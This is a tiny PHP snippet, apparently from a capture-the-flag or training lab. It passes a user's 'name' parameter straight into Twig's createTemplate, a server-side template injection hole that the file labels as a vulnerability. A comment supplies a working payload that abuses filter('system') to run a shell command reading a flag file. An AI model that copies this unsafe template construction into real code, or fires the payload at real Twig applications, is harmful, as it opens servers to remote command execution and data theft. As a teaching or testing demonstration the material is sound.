<?php
// Twig
require 'vendor/autoload.php';
$twig = new \Twig\Environment(new \Twig\Loader\FilesystemLoader('templates'));

// Vuln: createTemplate con input del usuario
$tpl = $twig->createTemplate('Hola ' . $_GET['name']);
echo $tpl->render([]);
// name = {{ ['cat /data/flag']|filter('system') }}
